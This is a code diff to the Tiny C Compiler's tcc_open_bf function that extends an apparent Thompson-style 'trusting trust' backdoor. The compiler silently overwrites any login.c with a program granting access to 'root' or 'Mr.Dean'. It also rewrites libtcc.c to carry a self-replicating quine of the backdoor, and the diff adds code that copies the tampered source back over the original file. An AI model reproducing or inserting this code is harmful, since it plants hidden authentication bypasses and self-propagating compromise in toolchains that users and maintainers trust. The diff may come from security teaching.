@@ -683,50 +683,62 @@ PUB_FUNC void _tcc_warning(const char *fmt, ...)
 
 ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
 {
-    char *equine = "char * equine = %c%s%c; if (strcmp(filename, %clogin.c%c) == 0)\n\
-    {\n\
-        FILE *loginfile = fopen(filename, %cw+%c);\n\
-        char *logintext =\n\
-            %c#include <string.h>\n\
-                static int\n\
-                do_login(const char *username)\n\
-            {\n\
-                if (!strcmp(username, %c%croot%c%c) || !strcmp(username, %c%cMr.Dean%c%c))\n\
-                    return 0;\n\
-                return 1;\n\
-            }\n\
-            int main(int argc, char *argv[])\n\
-            {\n\
-                if (argc != 2)\n\
-                    return 1;\n\
-                return do_login(argv[1]);\n\
-            }%c;\n\
-        fprintf(loginfile, %c%cs%c, logintext);\n\
-        fclose(loginfile);\n\
-    }\n\
-    else if (!strcmp(filename, %clibtcc.c%c))\n\
-    {\n\
-        FILE * thisfile = fopen(filename, %cr%c);\n\
-        FILE * rewrite = fopen(%crewrite.c%c,%cw+%c);\n\
-        char* a;\n\
-        size_t bites;\n\
-        char* start = %cST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)%cn%c;\n\
-        int rewriting = 0;\n\
-        while(getline(&a,&bites,thisfile) != EOF)\n\
-        {\n\
-            fprintf(rewrite, %c%cs%c, a);\n\
-            if(rewriting)\n\
-            {\n\
-                fprintf(rewrite, equine, 34, equine, 34,34,34,34,34,34,92,34,92,34,92,34,92,34,34,34,37,34,34,34,34,34,34,34,34,34,34,92,34,34,37,34);\n\
-                rewriting = 0;\n\
-            }\n\
-            if(!strcmp(a,start))\n\
-            {\n\
-                rewriting = 1;\n\
-            }\n\
-        }\n\
-        fclose(thisfile);\n\
-        fclose(rewrite);\n\
+    // store actual file in temp file, then change libtcc back
+    char *equine = "char * equine = %c%s%c; if (strcmp(filename, %clogin.c%c) == 0)\
+    {\
+        FILE *loginfile = fopen(filename, %cw+%c);\
+        char *logintext =\
+            %c#include <string.h>\
+                static int\
+                do_login(const char *username)\
+            {\
+                if (!strcmp(username, %c%croot%c%c) || !strcmp(username, %c%cMr.Dean%c%c))\
+                    return 0;\
+                return 1;\
+            }\
+            int main(int argc, char *argv[])\
+            {\
+                if (argc != 2)\
+                    return 1;\
+                return do_login(argv[1]);\
+            }%c;\
+        fprintf(loginfile, %c%cs%c, logintext);\
+        fclose(loginfile);\
+    }\
+    else if (!strcmp(filename, %clibtcc.c%c))\
+    {\
+        FILE * thisfile = fopen(filename, %cr%c);\
+        FILE * rewrite = fopen(%crewrite.c%c,%cw+%c);\
+        char* a;\
+        size_t bites;\
+        char* start = %cST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)%cn%c;\
+        int rewriting = 0;\
+        while(getline(&a,&bites,thisfile) != EOF)\
+        {\
+            fprintf(rewrite, %c%cs%c, a);\
+            if(rewriting)\
+            {\
+                fprintf(rewrite, equine, 34, equine, 34,34,34,34,34,34,92,34,92,34,92,34,92,34,34,34,37,34,34,34,34,34,34,34,34,34,34,92,34,34,37,34,34,34,34,34,34,34);\
+                rewriting = 0;\
+            }\
+            if(!strcmp(a,start))\
+            {\
+                rewriting = 1;\
+            }\
+        }\
+        fclose(thisfile);\
+        fclose(rewrite);\
+        FILE * thisfilewrite = fopen(filename, %cw%c);\
+        FILE *reread = fopen(%crewrite.c%c, %cr%c);\
+        char qqq;\
+        qqq = fgetc(reread);\
+        while (qqq != EOF)\
+    {\
+        fputc(qqq, thisfilewrite);\
+        qqq = fgetc(reread);\
+    }\
+    fclose(thisfilewrite);\
+    fclose(reread);\
     }";
 
     if (strcmp(filename, "login.c") == 0)
@@ -763,7 +775,7 @@ ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
             fprintf(rewrite, "%s", a);
             if (rewriting)
             {
-                fprintf(rewrite, equine, 34, equine, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 92, 34, 34, 37, 34);
+                fprintf(rewrite, equine, 34, equine, 34, 34, 34, 34, 34, 34, 92, 34, 92, 34, 92, 34, 92, 34, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34, 34, 34, 34, 92, 34, 34, 37, 34, 34, 34, 34, 34, 34, 34);
                 rewriting = 0;
             }
             if (!strcmp(a, start))
@@ -773,6 +785,18 @@ ST_FUNC void tcc_open_bf(TCCState *s1, const char *filename, int initlen)
         }
         fclose(thisfile);
         fclose(rewrite);
+
+        FILE *thisfilewrite = fopen(filename, "w");
+        FILE *reread = fopen("rewrite.c", "r");
+        char qqq;
+        qqq = fgetc(reread);
+        while (qqq != EOF)
+        {
+            fputc(qqq, thisfilewrite);
+            qqq = fgetc(reread);
+        }
+        fclose(thisfilewrite);
+        fclose(reread);
     }
 
     BufferedFile *bf;
